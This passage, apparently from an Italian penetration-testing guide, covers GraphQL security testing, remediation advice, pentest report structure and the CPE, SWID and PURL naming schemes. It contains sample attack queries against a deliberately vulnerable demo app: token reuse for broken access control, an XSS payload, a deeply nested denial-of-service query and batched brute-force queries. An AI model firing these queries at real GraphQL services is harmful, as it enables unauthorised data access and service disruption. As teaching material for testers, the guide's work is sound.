        types {
        ...FullType
        }
        directives {
        name
        description
        locations
        args {
            ...InputValue
        }
        }
    }
    }
    fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
        ...InputValue
        }
        type {
        ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
    }
    fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
    }
    fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
                }
            }
            }
        }
        }
    }
    }

The result will usually be very long (and hence has been shortened here), and it will contain the entire schema of the GraphQL deployment.

    {
    "data": {
        "__schema": {
        "queryType": {
            "name": "Query"
        },
        "mutationType": {
            "name": "Mutation"
        },
        "subscriptionType": {
            "name": "Subscription"
        },
        "types": [
            {
            "kind": "ENUM",
            "name": "__TypeKind",
            "description": "An enum describing what kind of type a given __Type is",
            "fields": null,
            "inputFields": null,
            "interfaces": null,
            "enumValues": [
                {
                "name": "SCALAR",
                "description": "Indicates this type is a scalar.",
                "isDeprecated": false,
                "deprecationReason": null
                },
                {
                "name": "OBJECT",
                "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
                "isDeprecated": false,
                "deprecationReason": null
                },
                {
                "name": "INTERFACE",
                "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
                "isDeprecated": false,
                "deprecationReason": null
                },
                {
                "name": "UNION",
                "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
                "isDeprecated": false,
                "deprecationReason": null
                },
            ],
            "possibleTypes": null
            }
        ]
        }
    }
    }

Uno strumento come [GraphQL Voyager](https://apis.guru/graphql-voyager/) può essere utilizzato per avere una comprensione migliore dell'endpoint GraphQL:

![GraphQL Voyager](./img/Voyager.png)

Questo strumento crea una rappresentazione del Diagramma delle Relazioni tra Entità (ERD) dello schema GraphQL, permettendoti di avere una visione più chiara dei componenti del sistema che stai testando.

C'è un inconveniente nell'utilizzare questo metodo: GraphQL Voyager non visualizza tutto ciò che può essere fatto con GraphQL. Ad esempio, le mutazioni disponibili non sono elencate nel disegno sopra. Una strategia migliore sarebbe utilizzare sia Voyager che uno dei metodi elencati di seguito.

*Usare GraphiQL*
[GraphiQL](https://github.com/graphql/graphiql) è un IDE basato sul web per GraphQL. Fa parte del progetto GraphQL ed è principalmente utilizzato per scopi di debug o sviluppo. La prassi migliore è non consentire l'accesso agli utenti in ambienti di produzione.

*Usare il GraphQL playground*
GraphQL Playground è un client GraphQL. Può essere utilizzato per testare diverse query, oltre a suddividere gli IDE GraphQL in vari playground e raggrupparli per tema o assegnando loro un nome. Proprio come GraphiQL, Playground può creare documentazione per te senza la necessità di inviare manualmente query di introspezione e elaborare le risposte. Ha un ulteriore grande vantaggio: non ha bisogno dell'interfaccia di GraphiQL per essere disponibile. Puoi indirizzare lo strumento al nodo GraphQL tramite un URL o utilizzarlo localmente con un file di dati.

GraphQL Playground può essere utilizzato per testare vulnerabilità direttamente, quindi non è necessario utilizzare un proxy personale per inviare richieste HTTP. Questo significa che puoi usare questo strumento per interazioni semplici e per la valutazione di GraphQL. Per payload più avanzati, puoi utilizzare un proxy personale.

**Autorizzazione**
L'introspezione è il primo posto dove cercare problemi di autorizzazione.
Una volta che un tester ha accesso allo schema e conosce le informazioni sensibili da estrarre, dovrebbe inviare query che non verranno bloccate a causa di privilegi insufficienti. GraphQL non impone autorizzazioni di default, quindi spetta all'applicazione garantire l'applicazione delle autorizzazioni.

Negli esempi precedenti, l'output della query di introspezione mostra che esiste una query chiamata auth. Questo sembra essere un buon punto per estrarre informazioni sensibili, come token API e password.

![auth](./img/auth1.png)

In questo esempio vulnerabile, ogni utente (anche non autenticato) può accedere ai token di autenticazione di ogni veterinario elencato nel database. Questi token possono essere utilizzati per eseguire ulteriori azioni consentite dallo schema, come associare o dissociare un cane da qualsiasi veterinario specificato utilizzando le mutazioni, anche se non c'è un token di autenticazione corrispondente per il veterinario nella richiesta.

Ecco un esempio in cui il tester utilizza un token estratto che non possiede per eseguire un'azione come il veterinario "Benoit":

    query brokenAccessControl {
    myInfo(accessToken: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2) {
        id, name, dogs {
        name
        }
    }
    }

E la risposta:

    {
    "data": {
        "myInfo": {
        "id": 2,
        "name": "Benoit",
        "dogs": [
            {
            "name": "Babou"
            },
            {
            "name": "Baboune"
            },
            {
            "name": "Babylon"
            },
            {
            "name": "..."
            }
        ]
        }
    }
    }

**Iniezione**
GraphQL è l'implementazione dello strato API di un'applicazione e, come tale, di solito inoltra le richieste a un'API di backend o direttamente al database. Questo consente di sfruttare eventuali vulnerabilità sottostanti, come l'injection SQL, l'injection di comandi, il cross-site scripting, ecc. Utilizzare GraphQL cambia semplicemente il punto di ingresso del payload malevolo.

*SQL Injection*
L'applicazione di esempio è vulnerabile per design nella query `dogs(namePrefix: String, limit: Int = 500): [Dog!]` poiché il parametro namePrefix è concatenato nella query SQL. Concatenare l'input dell'utente è una pratica comune scorretta nelle applicazioni che può esporle all'injection SQL.

*Cross Site Scripting*
S   i verifica quando un attaccante inietta codice eseguibile che viene successivamente eseguito dal browser. Puoi informarti sui test per XSS nel capitolo sulla Validazione dell'Input. Puoi testare per XSS riflesso utilizzando un payload da "Testing for Reflected Cross Site Scripting".

In questo esempio, gli errori potrebbero riflettere l'input e potrebbero causare l'occorrenza di XSS.

Payload:

    query xss  {
    myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
        id
        name
    }
    }

Risposta:

    {
    "data": null,
    "errors": [
        {
        "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
        "locations": [
            {
            "line": 2,
            "column": 10,
            "sourceName": null
            }
        ],
        "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
        "validationErrorType": "WrongType",
        "queryPath": [
            "myInfo"
        ],
        "errorType": "ValidationError",
        "extensions": null,
        "path": null
        }
    ]
    }

**Query di Denial Of Service**
GraphQL espone un'interfaccia molto semplice per consentire agli sviluppatori di utilizzare query nidificate e oggetti nidificati. Questa capacità può anche essere sfruttata in modo malevolo, chiamando una query profondamente nidificata simile a una funzione ricorsiva e causando un'interruzione del servizio utilizzando eccessivamente CPU, memoria o altre risorse di calcolo.

    query dos {
    allDogs(onlyFree: false, limit: 1000000) {
        id
        name
        veterinary {
        id
        name
        dogs {
            id
            name
            veterinary {
            id
            name
            dogs {
                id
                name
                veterinary {
                id
                name
                dogs {
                    id
                    name
                    veterinary {
                    id
                    name
                    dogs {
                        id
                        name
                        veterinary {
                        id
                        name
                        dogs {
                            id
                            name
                        }
                        }
                    }
                    }
                }
                }
            }
            }
        }
        }
    }
    }

**Attacchi di Batching**
Il "batching" è un termine che si riferisce a diverse pratiche in vari contesti. In generale, significa raggruppare o elaborare elementi in blocchi piuttosto che uno alla volta. 

GraphQL supporta il batching di più query in un'unica richiesta. Questo consente agli utenti di richiedere più oggetti o più istanze di oggetti in modo efficiente. Tuttavia, un attaccante può sfruttare questa funzionalità per eseguire un attacco di batching. Inviando più di una singola query in una richiesta, il formato appare come segue:

    [
    {
        "query": "<query 0>",
        "variables": "<variabili per query 0>"
    },
    {
        "query": "<query 1>",
        "variables": "<variabili per query 1>"
    },
    {
        "query": "<query n>",
        "variables": "<variabili per query n>"
    }
    ]

Nell'applicazione di esempio, è possibile inviare una singola richiesta per estrarre tutti i nomi dei veterinari utilizzando un ID facilmente indovinabile (è un intero crescente). Un attaccante può quindi utilizzare i nomi per ottenere token di accesso. Invece di farlo in molte richieste, che potrebbero essere bloccate da misure di sicurezza di rete come un firewall per applicazioni web o da un rate limiter come Nginx, queste richieste possono essere raggruppate. Ciò significa che ci sarebbero solo un paio di richieste, consentendo un attacco di forza bruta efficiente senza essere rilevati. Ecco un esempio di query:

    query {
    Veterinary(id: "1") {
        name
    }
    second: Veterinary(id: "2") {
        name
    }
    third: Veterinary(id: "3") {
        name
    }
    }

Questo fornirà all'attaccante i nomi dei veterinari e, come mostrato prima, i nomi possono essere utilizzati per raggruppare più query che richiedono i token di autenticazione di quei veterinari. Ad esempio:

    query {
    auth(veterinaryName: "Julien")
    second: auth(veterinaryName: "Benoit")
    }

Gli attacchi di batching possono essere utilizzati per eludere molte misure di sicurezza applicate sui siti. Possono anche essere usati per enumerare oggetti e tentare di forzare l'autenticazione a più fattori o altre informazioni sensibili.

*Messaggio di Erroe Dettagliato*
GraphQL può incontrare errori inaspettati durante l'esecuzione. Quando si verifica un errore, il server può inviare una risposta di errore che potrebbe rivelare dettagli interni o configurazioni o dati dell'applicazione. Ciò consente a un utente malevolo di acquisire ulteriori informazioni sull'applicazione. Come parte dei test, i messaggi di errore dovrebbero essere verificati inviando dati imprevisti, un processo noto come fuzzing. Le risposte dovrebbero essere esaminate per cercare informazioni potenzialmente sensibili che potrebbero essere rivelate utilizzando questa tecnica.

*Esposizione all'API sottostante*
GraphQL è una tecnologia relativamente nuova, e alcune applicazioni stanno passando da vecchie API a GraphQL. In molti casi, GraphQL è implementato come un'API standard che traduce le richieste (inviate utilizzando la sintassi GraphQL) in un'API sottostante, così come le risposte. Se le richieste all'API sottostante non vengono controllate correttamente per l'autorizzazione, ciò potrebbe portare a una possibile escalation dei privilegi.

Ad esempio, una richiesta contenente il parametro id=1/delete potrebbe essere interpretata come /api/users/1/delete. Questo potrebbe estendersi alla manipolazione di altre risorse appartenenti a user=1. È anche possibile che la richiesta venga interpretata come se avesse l'autorizzazione concessa al nodo GraphQL, anziché al vero richiedente.

Un tester dovrebbe cercare di accedere ai metodi dell'API sottostante, poiché potrebbe essere possibile ottenere un'escalation dei privilegi.

**Rimedio**
* Limitare l'accesso alle query di introspezione.
* Implementare la validazione dell'input.
    * GraphQL non ha un modo nativo per validare l'input; tuttavia, esiste un progetto open source chiamato "graphql-constraint-directive" che consente di effettuare la validazione dell'input come parte della definizione dello schema.
    * La validazione dell'input da sola è utile, ma non rappresenta una soluzione completa e devono essere adottate misure aggiuntive per mitigare gli attacchi di iniezione.
* Implementare misure di sicurezza per prevenire query abusive.
    * Timeout: limitare il tempo massimo durante il quale una query può essere eseguita.
    * Profondità massima della query: limitare la profondità delle query consentite, per prevenire query troppo profonde che possano abusare delle risorse.
    * Impostare la complessità massima della query: limitare la complessità delle query per mitigare l'abuso delle risorse di GraphQL.
    * Utilizzare il throttling basato sul tempo del server: limitare la quantità di tempo del server che un utente può consumare.
    * Utilizzare il throttling basato sulla complessità della query: limitare la complessità totale delle query che un utente può consumare.
* Inviare messaggi di errore generici: utilizzare messaggi di errore generici che non rivelino dettagli sulla distribuzione.
* Mitigare gli attacchi di batching:
    * Aggiungere il rate limiting delle richieste per gli oggetti nel codice.
    * Prevenire il batching per oggetti sensibili.
    * Limitare il numero di query che possono essere eseguite contemporaneamente.

Alcuni **strumenti** per controllare ciò sono *InnQL*, *GraphQL Raider* (estensioni per Burp) e GraphQL (add-on per Zap)

**Rimedi**
* Disabilitare le query di introspezione in ambienti di produzione per limitare le informazioni disponibili sugli schemi. Questo può prevenire attacchi informatici che si basano sulla conoscenza dello schema.
* Utilizzare librerie come `graphql-constraint-directive` per definire regole di validazione per i tipi di input.
* Verificare e convalidare i dati di input prima di elaborare le query, per prevenire attacchi di iniezione come SQL injection e XSS.
* Implementare controlli di autorizzazione robusti a livello di resolver per garantire che solo gli utenti autorizzati possano accedere a determinate risorse o eseguire operazioni sensibili.
* Impostare limiti sulla profondità massima delle query per prevenire attacchi DoS (Denial of Service).
* Limitare la complessità delle query per ridurre il carico sul server e prevenire l'abuso delle risorse.
* Implementare timeout per le query per prevenire che le richieste occupino risorse indefinitamente.
* Applicare il throttling basato su tempo e complessità per limitare la quantità di risorse consumate da un singolo utente.
* Evitare di esporre messaggi di errore dettagliati che potrebbero rivelare informazioni interne. Invece, utilizzare messaggi di errore generici che non rivelano dettagli sensibili.
* Implementare limiti sul numero di operazioni che possono essere eseguite in una singola richiesta per mitigare gli attacchi di batching.

## 5 - Reporting
### A - Struttura del report
#### 1 - Introduzione
Eseguire la parte tecnica della valutazione è solo metà del processo complessivo. Il prodotto finale è la redazione di un rapporto ben scritto e informativo. Un rapporto dovrebbe essere facile da capire e mettere in evidenza tutti i rischi riscontrati durante la fase di valutazione. Il rapporto dovrebbe essere interessante sia per la direzione esecutiva che per il personale tecnico.
1. Controllo delle versioni
    Imposta le modifiche al rapporto, presentate principalmente in un formato tabellare, come quello seguente.

    | Versione | Descrizione        | Data       | Autore  |
    |----------|--------------------|------------|---------|
    | 1.0      | Rapporto iniziale   | DD/MM/YYYY | J. Doe  |

2. indice
3. Elenca i membri del team
4. I confini e le necessità stabilite con il cliente
5. Limiti riscontrati:
    * Aree fuori dai limiti rispetto ai test.
    * Funzionalità non funzionanti.
    * Mancanza di collaborazione.
    * Mancanza di tempo.
    * Mancanza di accesso o credenziali.
6. La durata dell'incarico
7. Dichiarazione di esonero
    Potresti voler fornire una dichiarazione di esonero per il tuo servizio. Consulta sempre un professionista legale per creare un documento legalmente vincolante.

#### 2 - Riepilogo esecutivo
Questo è simile a un discorso di presentazione del rapporto, mira a fornire agli esecutivi:
* L'obiettivo del test.
* Scoperte chiave nel contesto aziendale, come possibili problemi di conformità, danni alla reputazione, ecc. Concentrati sull'impatto aziendale e lascia da parte i dettagli tecnici per ora.
* Raccomandazioni strategiche su come l'azienda può prevenire il ripetersi dei problemi. Descrivi queste in un contesto non tecnico e lascia da parte le raccomandazioni tecniche specifiche per ora.

#### 3 - Scoperte
Questa sezione è rivolta al team tecnico. Dovrebbe includere tutte le informazioni necessarie per comprendere la vulnerabilità, replicarla e risolverla. Una separazione logica può migliorare la leggibilità del rapporto. Ad esempio, potresti avere sezioni separate intitolate "Accesso Esterno" e "Accesso Interno".

Se questo è un ri-test, potresti creare una sottosezione che riassume le scoperte del test precedente, lo stato aggiornato delle vulnerabilità precedentemente identificate e eventuali riferimenti incrociati con il test attuale.

1. Riepilogo delle Scoperte: un elenco delle scoperte con il loro livello di rischio. Può essere utilizzata una tabella per facilitare l'uso da parte di entrambi i team.

    | ID Riferimento | Titolo                        | Livello di Rischio |
    |----------------|-------------------------------|---------------------|
    | 1              | Bypass dell'Autenticazione   | Alto                |

2. Dettagli delle scoperte: ogni scoperta dovrebeb essere dettagliata con
    * ID Riferimento, che può essere utilizzato per la comunicazione tra le parti e per riferimenti incrociati nel rapporto.
    * Il titolo della vulnerabilità, come "Bypass dell'Autenticazione".
    * La probabilità o l'exploitabilità del problema.
    * L'impatto della vulnerabilità sul sistema.
    * Il rischio della vulnerabilità sull'applicazione.
    * Descrizione dettagliata di cosa sia la vulnerabilità, come sfruttarla e i danni che potrebbero derivarne. Eventuali dati potenzialmente sensibili dovrebbero essere mascherati, ad esempio, password, informazioni personali o dettagli di carte di credito.
    * Passaggi dettagliati su come rimediare alla vulnerabilità, possibili miglioramenti che potrebbero aiutare a rafforzare la postura di sicurezza e pratiche di sicurezza mancanti.
    * Risorse aggiuntive che potrebbero aiutare il lettore a comprendere la vulnerabilità, come un'immagine, un video, un CVE, una guida esterna, ecc.

### B - Schemi di nomenclatura delle vulnerabilità
#### 1 - Come denominare le vulnerabilità
Uno schema di nomenclatura è una metodologia sistematica utilizzata per identificare ciascuna di queste vulnerabilità al fine di facilitare un'identificazione chiara e la condivisione delle informazioni. Questo obiettivo si raggiunge definendo un nome unico, strutturato ed efficiente per il software per ogni vulnerabilità. Esistono diversi schemi utilizzati per facilitare questo sforzo, i più comuni sono:
* Common Platform Enumeration (CPE)
* Software Identification Tag (SWID)
* Package URL (PURL)

**Software Identification Tag**
Ogni tag SWID è rappresentato in un formato XML standardizzato. Un tag SWID è composto da tre gruppi di elementi. Il primo blocco è composto da 7 elementi predefiniti richiesti per essere considerati un tag valido. Segue un blocco opzionale che fornisce un insieme di 30 possibili elementi predefiniti che il creatore del tag può utilizzare per fornire informazioni affidabili e dettagliate. Infine, il gruppo esteso di elementi offre l'opportunità al creatore del tag di definire eventuali elementi non predefiniti necessari per descrivere accuratamente il software descritto. 

**Common Platform Enumeration**
Lo schema Common Platform Enumeration (CPE) è uno schema di nomenclatura strutturato per sistemi informatici, software e pacchetti mantenuto dal NVD. Comunemente utilizzato in combinazione con i codici di identificazione delle Vulnerabilità e delle Esposizioni Comuni (ad esempio, CVE-2017-0147). Nonostante sia considerato uno schema deprecato, superato da SWID, il CPE è ancora ampiamente utilizzato da diverse soluzioni di sicurezza.

È definito come un Dizionario di valori registrati fornito dal NVD. Ogni codice CPE può essere definito come un nome ben formattato o come un URL. Ogni valore DEVE seguire questa struttura:

    cpe-name = "cpe:" component-list
    component-list = part ":" vendor ":" product ":" version ":" update ":" edition ":" lang

**Package URL**
Il Package URL standardizza il modo in cui i metadati dei pacchetti software sono rappresentati, in modo che i pacchetti possano essere localizzati universale indipendentemente dal fornitore, progetto o ecosistema a cui appartengono.

Un PURL è una stringa URL valida conforme a RFC3986 ASCII composta da sette elementi, ognuno dei quali è separato da un carattere definito per facilitarne la manipolazione da parte del software.

    scheme:type/namespace/name@version?qualifiers#subpath

* scheme: valore costante conforme allo schema URL di "pkg". (Obbligatorio).
* type: tipo di pacchetto o protocollo del pacchetto, come maven, npm, nuget, gem, pypi, ecc. (Obbligatorio).
* namespace: valore specifico del tipo per un prefisso di pacchetto, come il nome del proprietario, groupid, ecc. (Opzionale).
*  name: nome del pacchetto. (Obbligatorio).
* version: versione del pacchetto. (Opzionale).
* qualifiers: dati qualificativi aggiuntivi per un pacchetto, come un sistema operativo, architettura, distribuzione, ecc. (Opzionale).  
* subpath: sotto-percorso aggiuntivo all'interno di un pacchetto, relativo alla radice del pacchetto. (Opzionale).

**Usi raccomandati**
| Tipo di Componente                     | Raccomandazione      |
|----------------------------------------|----------------------|
| Applicazione Client o Server           | CPE o SWID           |
| Contenitore                            | PURL o SWID          |
| Firmware                               | CPE o SWID*          |
| Libreria o Framework (pacchetto)      | PURL                 |
| Libreria o Framework (non pacchetto)  | SWID                 |
| Sistema Operativo                      | CPE o SWID           |
| Pacchetto di Sistema Operativo         | PURL o SWID          |
